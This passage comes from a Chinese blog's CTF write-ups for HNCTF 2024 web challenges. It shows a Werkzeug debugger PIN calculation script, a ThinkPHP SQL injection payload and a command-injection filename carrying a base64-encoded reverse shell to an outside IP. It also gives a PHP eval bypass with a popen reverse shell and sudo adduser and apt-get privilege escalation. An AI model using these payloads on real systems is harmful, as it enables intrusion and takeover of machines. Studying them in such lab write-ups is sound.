class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="comment"># machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="comment"># get_machine_id(), /etc/machine-id  /proc/sys/kernel/random/boot_id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p><code>/hint</code>路由中给出是过滤了self和cgroup的，文章：<a href="https://blog.csdn.net/weixin_63231007/article/details/131659892%E9%87%8C%E7%BB%99%E5%87%BA%E4%BA%86%E6%96%B9%E6%B3%95%EF%BC%9A">https://blog.csdn.net/weixin_63231007/article/details/131659892里给出了方法：</a></p><ul><li>过滤了self的时候怎么读 machine-id   <ul><li>其中的<code>self</code>可以用相关进程的pid去替换,其实<code>1</code>就行</li></ul></li><li>过滤 cgroup<ul><li>用<code>mountinfo</code>或者<code>cpuset</code></li></ul></li></ul><p>还过滤了mountinfo，所以在读machine-id时可以用&#x2F;proc&#x2F;1&#x2F;cpuset来绕过，根目录下有flag文件，但我们是ctfUser，权限不够，直接读环境变量出flag</p><p><img src="https://img.picui.cn/free/2024/06/01/665b08bab9727.png" alt="image-20240526204639811.png"></p><h3 id="ez-tp（tp3-2-3）"><a href="#ez-tp（tp3-2-3）" class="headerlink" title="ez_tp（tp3.2.3）"></a>ez_tp（tp3.2.3）</h3><p>下载附件看到是tp3.2.3</p><p><img src="https://img.picui.cn/free/2024/06/01/665b08bad3455.png" alt="屏幕截图 2024-05-26 211938.png"></p><p><img src="https://img.picui.cn/free/2024/06/01/665b08baca9f0.png" alt="image-20240526212318203.png"></p><p>sql注入中的exp注入，具体调试见文章：<a href="https://blog.csdn.net/rfrder/article/details/114024426">https://blog.csdn.net/rfrder/article/details/114024426</a></p><p>GET传参是参数名为name，且只回显两个字段，故payload：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">index</span>.php/home/<span class="keyword">index</span>/h_n?<span class="type">name</span>[<span class="number">0</span>]=exp&amp;<span class="type">name</span>[<span class="number">1</span>]==<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure><p>我这查表名的时候不知道为啥查不出来</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">index</span>.php/home/<span class="keyword">index</span>/h_n?<span class="type">name</span>[<span class="number">0</span>]=exp&amp;<span class="type">name</span>[<span class="number">1</span>]==<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;think&#x27;</span>     #回显<span class="keyword">false</span></span><br></pre></td></tr></table></figure><h3 id="GoJava（文件名处恶意命令拼接）"><a href="#GoJava（文件名处恶意命令拼接）" class="headerlink" title="GoJava（文件名处恶意命令拼接）"></a>GoJava（文件名处恶意命令拼接）</h3><p>访问<code>robots.txt</code>路由可以看到有个<code>/main-old.zip</code>路由，访问后得到源码，源码中可以看到对文件名进行了过滤</p><p><img src="https://img.picui.cn/free/2024/06/01/665b08f9113a9.png" alt="屏幕截图 2024-05-26 223501.png"></p><p>试试文件名弹shell，文件名改为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="built_in">echo</span> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTk1LjE5NC8yMzMzIDA+JjEi | <span class="built_in">base64</span> -d | bash;1.java</span><br></pre></td></tr></table></figure><p>弹成功了，确实是文件名处恶意命令拼接，<code>ls /</code>可以看到<code>memorandum</code>也就是备忘录，拿到密码后<code>su root</code>登录<code>root</code>账户在<code>/root/flAg</code>中拿到flag</p><p><img src="https://img.picui.cn/free/2024/06/01/665b090fe0f28.png" alt="image-20240526224835164.png"></p><h3 id="GPTS（CVE-2024-31224、基础渗透）"><a href="#GPTS（CVE-2024-31224、基础渗透）" class="headerlink" title="GPTS（CVE-2024-31224、基础渗透）"></a>GPTS（CVE-2024-31224、基础渗透）</h3><p>进题是个gpt，z3佬说这种一般都是搜的新cve，打个pickle反序列化，我不知道为啥弹不起shell，弹shell登录的是ctfgame用户</p><p>查找由用户 <code>ctfgame</code> 拥有并且对其可读的所有文件</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="keyword">type</span> f -<span class="keyword">user</span> <span class="title">ctfgame</span> -readable <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>find</code>: 这是主命令，用于在指定的目录及其子目录中查找文件。</li><li><code>/</code>: 这是find命令的起点，即从根目录开始搜索。根目录是文件系统的最高层级目录。</li><li><code>-type f</code>: 这个选项指定了要查找的对象类型，<code>f</code>表示只查找普通文件，不包括目录、链接等其他类型的文件。</li><li><code>-user ctfgame</code>: 这个选项用来过滤找到的文件，只显示属于用户<code>ctfgame</code>的文件。这意味着文件的所有者是<code>ctfgame</code>。</li><li><code>-readable</code>: 这个选项可能不是所有版本的<code>find</code>命令都支持。它通常意味着只显示可读的文件，即当前用户有权限阅读的文件。不过，这个选项的具体行为可能会根据系统的find实现有所不同。在一些系统中，如果明确需要查找用户可读文件，可能需要通过权限测试来实现，例如<code>-perm /o=r</code>来查找其他人可读的文件。</li><li><code>2&gt;/dev/null</code>: 这部分是重定向操作。<code>2</code>代表标准错误输出，<code>&gt;</code>是重定向符号，<code>/dev/null</code>是一个特殊的文件，任何写入它的数据都会被丢弃。因此，<code>2&gt;/dev/null</code>的意思是将查找过程中可能出现的错误信息（比如权限 denied 的警告）丢弃，不让它们显示在终端上，使得输出更加干净，只关注实际查找到的文件列表</li></ul></blockquote><p>查看&#x2F;var&#x2F;mail&#x2F;ctfgame，读邮件中的敏感信息，如下</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">From</span> root,</span><br><span class="line"><span class="keyword">To</span> ctfgame(ctfer),</span><br><span class="line"></span><br><span class="line">You know that I<span class="comment">&#x27;m giving you permissions to make it easier for you to build your website, but now your users have been hacked.</span></span><br><span class="line"></span><br><span class="line">This <span class="built_in">is</span> the last chance, please <span class="keyword">take</span> care <span class="keyword">of</span> your security, I helped you reset your account password.</span><br><span class="line"></span><br><span class="line">ctfer : KbsrZrSCVeui#+R</span><br><span class="line"></span><br><span class="line">I hope you cherish this opportunity.</span><br></pre></td></tr></table></figure><p>用密码<code>KbsrZrSCVeui#+R</code>切换到ctfer账户，没权限看&#x2F;etc&#x2F;sudoers ，用sudo -l</p><blockquote><p>sudo -l：查看当前用户通过sudo命令能执行哪些权限提升的操作</p></blockquote><p>回显内容如下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> ctfer on hnctf-01<span class="symbol">hxryr832qjjc3astkt4rw4dw:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=<span class="regexp">/usr/local</span><span class="regexp">/sbin\:/usr</span><span class="regexp">/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> ctfer may run the following commands on hnctf-01<span class="symbol">hxryr832qjjc3astkt4rw4dw:</span></span><br><span class="line">    (root) <span class="variable constant_">NOPASSWD</span>: <span class="regexp">/usr/sbin</span><span class="regexp">/adduser, !/usr</span><span class="regexp">/sbin/adduser</span> * sudo, !<span class="regexp">/usr/sbin</span><span class="regexp">/adduser * admin</span></span><br></pre></td></tr></table></figure><blockquote><ol><li><strong>Defaults entries for ctfer</strong>: 这部分显示了应用到用户<code>ctfer</code>的默认sudo配置项，这些设置适用于该用户的所有sudo操作。这里列出了三项：<ul><li><code>env_reset</code>: 在执行sudo命令前重置环境变量，提高安全性。</li><li><code>mail_badpass</code>: 如果sudo执行时密码验证失败，发送邮件通知。</li><li><code>secure_path</code>: 设定执行sudo命令时使用的安全路径，确保命令来自系统信任的目录。列出的路径包括<code>/usr/local/sbin</code>, <code>/usr/local/bin</code>, <code>/usr/sbin</code>, <code>/usr/bin</code>, <code>/sbin</code>, 和 <code>/bin</code>。</li></ul></li><li><strong>User ctfer may run the following commands</strong>: 接下来的部分详细列出了<code>ctfer</code>用户被授权可以执行的具体命令，以及这些命令的执行条件：<ul><li><code>(root) NOPASSWD: /usr/sbin/adduser</code>: 用户<code>ctfer</code>可以无密码（NOPASSWD）以root权限执行<code>/usr/sbin/adduser</code>命令，即添加新用户的操作。<code>/usr/sbin/adduser</code> 是一个方便的命令行工具，用于在 Linux 系统中管理用户账户。 </li><li><code>!/usr/sbin/adduser * sudo</code>: 但是，禁止（用”!”表示）<code>ctfer</code>使用<code>adduser</code>命令为任何用户名（星号<code>*</code>代表任意用户名）添加sudo权限。这意味着不能通过<code>adduser</code>命令直接赋予其他用户sudo访问权限。</li><li><code>!/usr/sbin/adduser * admin</code>: 同样，也禁止为任何用户名添加“admin”权限或角色，进一步限制了通过<code>adduser</code>命令赋予高权限的能力。</li></ul></li></ol></blockquote><p>添加一个root组用户</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser test <span class="attribute">-gid</span>=0</span><br></pre></td></tr></table></figure><blockquote><p><code>-gid=0</code>: 指定了新建用户的主要组ID（Group ID，GID）为0。在大多数类UNIX系统中，GID 0对应于root组，这是系统中拥有最高权限的组。通常，只有root用户属于这个组。</p></blockquote><p>以root组用户test登录后查看<code>/etc/sudoers</code>文件</p><blockquote><p><code>/etc/sudoers</code>：sudo授权规则配置文件，它定义了用户或用户组在系统上执行哪些命令时可以获得超级用户（root）的权限，以及这些命令可以在哪些主机上执行，并可以指定是否需要密码。</p></blockquote><p>得到</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This file MUST be edited with the &#x27;visudo&#x27; command as root.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Please consider adding local content in /etc/sudoers.d/ instead of</span></span><br><span class="line"><span class="comment"># directly modifying this file.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See the man page for details on how to write a sudoers file.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">Defaults        env_reset</span><br><span class="line">Defaults        mail_badpass</span><br><span class="line">Defaults        secure_path=<span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Host alias specification</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># User alias specification</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cmnd alias specification</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># User privilege specification</span></span><br><span class="line">root    <span class="literal">ALL</span>=(<span class="literal">ALL</span>:<span class="literal">ALL</span>) <span class="literal">ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow members of group sudo to execute any command</span></span><br><span class="line">%sudo   <span class="literal">ALL</span>=(<span class="literal">ALL</span>:<span class="literal">ALL</span>) <span class="literal">ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See sudoers(5) for more information on &quot;@include&quot; directives:</span></span><br><span class="line"></span><br><span class="line">@includedir /etc/sudoers.d</span><br><span class="line">ctfer <span class="literal">ALL</span>=(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * <span class="literal">admin</span></span><br><span class="line">kobe <span class="literal">ALL</span>=(root) PASSWD: /usr/bin/apt-get</span><br></pre></td></tr></table></figure><p>以上内容中<code>kobe ALL=(root) PASSWD: /usr/bin/apt-get</code>表示用户<code>kobe</code>可以以root身份执行<code>apt-get</code>命令，但需要输入密码。</p><p>kobe可以apt-get提权，现在我们要以kobe身份登录，先切回ctfer，sudo adduser kobe创建一个kobe用户</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo adduser kobe</span></span><br></pre></td></tr></table></figure><p>再以kobe身份登录，apt-get提权，apt-get提权见文章：<a href="https://lzcloudsecurity.gitbook.io/yun-an-quan-gong-fang-ru-men/di-er-zhang-linux-gong-fang-kuai-su-ru-men-shang/sudo-shou-quan-yu-ti-quan">SUDO授权与提权 | 云安全攻防入门</a></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update -o APT::Update::Pre-Invoke::=<span class="string">&quot;/bin/bash -i&quot;</span></span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/f*/f*</span><br></pre></td></tr></table></figure><h3 id="奇怪的网站（302跳转、OPTIONS请求、基础提权）"><a href="#奇怪的网站（302跳转、OPTIONS请求、基础提权）" class="headerlink" title="奇怪的网站（302跳转、OPTIONS请求、基础提权）"></a>奇怪的网站（302跳转、OPTIONS请求、基础提权）</h3><p>进题会发现302跳转直接跳转到<code>/index.png</code>路由，抓个只有网址的包</p><p><img src="https://img.picui.cn/free/2024/06/01/665b093feadca.png" alt="image-20240527173406132.png"></p><p>可以看到配置为<code>Apache/2.4.25 (Debian)</code>，然后php版本为5.6.40，vim那串字符的内容是<code>vim怎么异常退出了啊啊啊啊~</code>我这里bp中文解析不了，说明还存在vim缓存文件泄露</p><p>扫目录发现<code>/flag.php</code>和<code>/404.php</code>，抓404.php的包可以看到响应头中有提示</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Secret: After PUT, does <span class="keyword">the</span> server <span class="built_in">write</span> <span class="keyword">the</span> <span class="built_in">file</span> directly?preflight?</span><br></pre></td></tr></table></figure><p>而且响应头的Cookie的值<code>?ff</code>后面读文件会用，为PUT是一个请求方法，preflight是预检请求，大概意思就是preflight请求使用 OPTIONS方法向服务器询问对于即将发起的跨域请求服务器是否给予权限，浏览器会查看服务器返回的响应头信息来确定是否可以安全地进行 PUT 请求</p><p>flag.php的缓存文件为 .flag.php.swm(4次异常退出导致)，下载下来后发现是乱码，用<code>vim -r flag.php.swm</code>恢复一下得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">you find me!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="variable">$b</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$num</span>); <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$c</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$num</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="variable">$c</span> &gt;= <span class="variable">$a</span>) &amp;&amp; (<span class="variable">$c</span> &lt;= <span class="variable">$b</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> <span class="variable">$num</span> == <span class="string">&#x27;11259375&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br></pre></td></tr></table></figure><p>以上代码就是要求num的值不包含数字1到9且最后结果为11259375，十六进制0xabcdef绕即可，得到</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">hint:</span> 没有扫到那个文件吗?!或者去首页看看?</span><br></pre></td></tr></table></figure><p>首页是<code>/index.png</code>路由，又结合网站是个php网站，猜测有可能是在⼀个 php ⽂件⾥预先包含了 index.png， 那么就⼀定 有 .htaccess 的配置⽂件 ， 以及之前扫目录扫出很多 htaccess 的相关⽂件，先发一个OPTIONS请求的包看下能用哪些请求方式</p><p><img src="https://img.picui.cn/free/2024/06/01/665b093fdb670.png" alt="image-20240527203330141.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">OPTIONS</span> /<span class="number">404</span>.php?ff=.htaccess HTTP/<span class="number">1</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><p>发包读<code>.htaccess</code>文件得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">order</span> <span class="literal">deny</span>,<span class="literal">allow</span></span><br><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteBase</span> /</span><br><span class="line"><span class="attribute">RewriteRule</span> ^(.*gggoku).php$ ggggoku.php<span class="meta"> [NC]</span></span><br></pre></td></tr></table></figure><blockquote><ol><li><code>Order deny,allow</code>: 这一行是Apache旧的访问控制语法，用于确定访问权限的处理顺序。<code>deny</code>先行，意味着先执行拒绝访问的规则，然后才是允许访问的规则。不过，这个指令在Apache 2.4及以上版本中已被弃用，现在推荐使用<code>Require</code>指令来控制访问权限。</li><li><code>RewriteEngine On</code>: 这行启用了Apache的重写引擎，使得后续的重写规则能够生效。重写引擎是实现URL美化、路由等功能的关键组件。</li><li><code>RewriteBase /</code>: 设定重写规则的基准目录为网站根目录。这意味着在重写规则中的相对路径都将从网站根目录开始计算。</li><li><code>RewriteRule ^(.*gggoku)\.php$ ggggoku.php [NC]</code>: 这是一条具体的重写规则，其意义是，对于所有以”.php”结尾，且URL路径中包含”gggoku”字符串的请求，都将被重定向到”ggggoku.php”。这里的<code>^(.*gggoku)\.php$</code>是一个正则表达式，匹配以任何字符序列开始，接着是”gggoku”，然后是”.php”结束的字符串。方括号内的<code>[NC]</code>表示不区分大小写(NC stands for No Case)，即在进行匹配时不区分字母的大小写。</li></ol></blockquote><p>继续读<code>ggggoku.php</code>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/`/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono~~~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$b=&quot;&#x27;</span> . <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;RCE都不会了?&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上绕过见文章:<a href="https://blog.csdn.net/silence1_/article/details/102853517,%E9%80%9A%E8%BF%87%E6%9F%A5%E7%9C%8Bphpinfo%E5%8F%91%E7%8E%B0%E7%A6%81%E7%94%A8%E4%BA%86%E5%BE%88%E5%A4%9A%E5%87%BD%E6%95%B0%EF%BC%8C%E4%BD%86%E5%8F%91%E7%8E%B0popen%E5%87%BD%E6%95%B0%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%EF%BC%8Cfget%E4%B9%9F%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%E7%94%A8fgetss%E8%AF%BB%EF%BC%8C">https://blog.csdn.net/silence1_/article/details/102853517,通过查看phpinfo发现禁用了很多函数，但发现popen函数可以使用，fget也被过滤了用fgetss读，</a></p><p>反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span>: /ggggoku.php?a=<span class="variable">$&#123;eval($_POST[0])&#125;</span></span><br><span class="line"><span class="attribute">POST</span>: <span class="number">0</span>=%<span class="number">24</span>fd%<span class="number">3</span>Dpopen%<span class="number">28</span>%<span class="number">22</span>bash+-c++%<span class="number">27</span>bash+i+%<span class="number">3</span>E%<span class="number">26</span>+%<span class="number">2</span>Fdev%<span class="number">2</span>Ftcp%<span class="number">2</span>Fip%<span class="number">2</span>Fport+<span class="number">0</span>%<span class="number">3</span>E%<span class="number">261</span>%<span class="number">27</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B++%<span class="number">0</span>Awhile%<span class="number">28</span>%<span class="number">24</span>s%<span class="number">3</span>Dfgetss%<span class="number">28</span>%<span class="number">24</span>fd%<span class="number">29</span>%<span class="number">29</span>%<span class="number">7</span>B++%<span class="number">0</span>Aprint_r%<span class="number">28</span>%<span class="number">24</span>s%<span class="number">29</span>%<span class="number">3</span>B++%<span class="number">0</span>A%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>🌿了这个也弹不起，最后就是提权读flag</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure><blockquote><ul><li><code>find</code>：是Linux系统中用于查找和遍历文件层次结构的命令。</li><li><code>/</code>：是查找的起点，这里表示从根目录开始在整个文件系统中搜索。</li><li><code>-perm -u=s</code>：这是一个权限相关的选项，用于匹配具有特定权限的文件。<code>-u=s</code>意味着只查找那些用户权限位中设置了setuid位的文件。setuid权限允许任何用户以文件所有者的权限来运行该程序，这在需要提升权限执行某些操作的场景下很有用，但也可能带来安全风险。</li><li><code>-type f</code>：这个选项指定了要查找的对象类型，<code>f</code>代表普通文件，意味着只查找文件，不包括目录、链接等其他类型的文件。</li><li><code>2&gt;/dev/null</code>：这部分是重定向操作，<code>2&gt;</code>表示将标准错误（stderr，错误输出）重定向，<code>/dev/null</code>是一个特殊的文件，任何写入它的数据都会被丢弃。所以，此命令在执行过程中遇到的任何权限不足或无法访问目录的错误信息都不会显示出来，使输出更加干净，只关注找到的文件结果。</li></ul></blockquote><p>得到</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/chfn</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chsh</span></span><br><span class="line"><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/bin/su</span></span><br></pre></td></tr></table></figure><p>用su命令，root密码在&#x2F;home&#x2F;admin&#x2F;passwd文件中, 借下lzy的图了</p><p><img src="https://img.picui.cn/free/2024/06/01/665b093feff3f.png" alt="image-20240527215129673.png"></p><p>参考：</p><p><a href="https://lisien11.github.io/2024/05/13/hnctf-wp/">https://lisien11.github.io/2024/05/13/hnctf-wp/</a></p><p><a href="https://z3r4y.blog.csdn.net/article/details/138844248?spm=1001.2014.3001.5502">https://z3r4y.blog.csdn.net/article/details/138844248?spm=1001.2014.3001.5502</a></p><p><a href="https://docs.qq.com/doc/p/641e8742c39d16cd6d046b18bcb251fd3ab0cd6d?ADUIN=2869873959&ADSESSION=1716725232&ADTAG=CLIENT.QQ.6061_.0&ADPUBNO=27411&jumpuin=2869873959">https://docs.qq.com/doc/p/641e8742c39d16cd6d046b18bcb251fd3ab0cd6d?ADUIN=2869873959&amp;ADSESSION=1716725232&amp;ADTAG=CLIENT.QQ.6061_.0&amp;ADPUBNO=27411&amp;jumpuin=2869873959</a></p>]]></content>
      
      
      <categories>
          
          <category> CTFwp及复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp及复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2024 web wp(17/18)</title>
      <link href="/2024/04/28/XYCTF2024-web-wp-17-18/"/>
      <url>/2024/04/28/XYCTF2024-web-wp-17-18/</url>
      
